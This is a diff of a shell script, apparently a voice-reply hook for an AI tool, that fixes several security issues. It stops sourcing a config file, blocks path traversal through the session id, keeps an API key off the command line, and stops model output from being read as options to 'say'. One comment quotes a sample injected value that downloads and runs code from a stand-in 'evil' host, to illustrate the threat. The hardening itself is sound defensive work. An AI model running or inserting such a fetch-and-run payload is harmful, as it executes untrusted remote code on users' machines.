@@ -8,8 +8,22 @@ STATE="$ROOT/state"
 mkdir -p "$STATE"
 chmod 700 "$STATE" 2>/dev/null  # owner-only: kokoro.port in here carries the daemon token
 
-# Load config (simple key=value file; safe to source, values have no spaces).
-[ -f "$ROOT/config" ] && . "$ROOT/config"
+# Read the known config keys explicitly, never source the file: it is written
+# from installer pastes and the README invites hand-editing, so a value like
+# x$(curl evil|sh) must stay a string, not run on every reply (R-11). Same
+# parser as voice-context.sh and uninstall.sh.
+cfg_read() { sed -n "s/^[[:space:]]*$1[[:space:]]*=[[:space:]]*//p" "$ROOT/config" 2>/dev/null | tail -1; }
+engine="$(cfg_read engine)"
+python_cmd="$(cfg_read python_cmd)"
+kokoro_python="$(cfg_read kokoro_python)"
+edge_voice="$(cfg_read edge_voice)"
+edge_rate="$(cfg_read edge_rate)"
+kokoro_voice="$(cfg_read kokoro_voice)"
+kokoro_speed="$(cfg_read kokoro_speed)"
+eleven_voice="$(cfg_read eleven_voice)"
+eleven_model="$(cfg_read eleven_model)"
+voice_speed="$(cfg_read voice_speed)"
+native_voice="$(cfg_read native_voice)"
 engine="${engine:-edge}"
 
 # Which interpreter to use. Bare python3 resolves against the PATH of whichever
@@ -22,6 +36,11 @@ py_cmd="${python_cmd:-${kokoro_python:-python3}}"
 RAW="$(cat)"
 [ -z "$RAW" ] && exit 0
 sid="$(printf '%s' "$RAW" | node "$ROOT/lib/json-get.mjs" session_id)"
+# The session id lands in file paths, so clamp anything outside [A-Za-z0-9_-]
+# to the shared-state id rather than letting ../ traverse (R-13).
+case "$sid" in
+  *[!A-Za-z0-9_-]*) sid="nosession" ;;
+esac
 
 global_on="$STATE/voice-on"
 on_flag="$STATE/on.$sid"
@@ -123,8 +142,11 @@ fi
     model="${eleven_model:-eleven_flash_v2_5}"
     if [ -n "$key" ]; then
       body="$(node "$ROOT/lib/eleven-body.mjs" "$spoken" "$model")"
-      curl -s -X POST "https://api.elevenlabs.io/v1/text-to-speech/$voice?output_format=mp3_44100_128" \
-        -H "xi-api-key: $key" -H "Content-Type: application/json" -d "$body" -o "$mp3"
+      # The key goes in via a curl config on stdin, never argv: anything on the
+      # command line is visible to every process of this user via ps (R-12).
+      printf 'header = "xi-api-key: %s"\n' "$key" | \
+        curl -s --config - -X POST "https://api.elevenlabs.io/v1/text-to-speech/$voice?output_format=mp3_44100_128" \
+          -H "Content-Type: application/json" -d "$body" -o "$mp3"
       if [ -s "$mp3" ] && [ "$(wc -c < "$mp3")" -gt 500 ] && afplay "$mp3"; then spoke=1; fi
     fi
   fi
@@ -135,7 +157,10 @@ fi
     say_args=""
     [ -n "$speed_mul" ] && say_args="-r $(awk -v m="$speed_mul" 'BEGIN{printf "%d", 175*m}')"
     # shellcheck disable=SC2086  # say_args is deliberately word-split: empty, or "-r <wpm>"
-    if [ -n "${native_voice:-}" ]; then say $say_args -v "$native_voice" "$spoken"; else say $say_args "$spoken"; fi
+    # -- terminates option parsing: the text is model output, and a reply
+    # starting with -o would otherwise make say write a file instead of
+    # speaking (R-14).
+    if [ -n "${native_voice:-}" ]; then say $say_args -v "$native_voice" -- "$spoken"; else say $say_args -- "$spoken"; fi
   fi
 
   rm -f "$mp3" "$wav" "$pidfile"
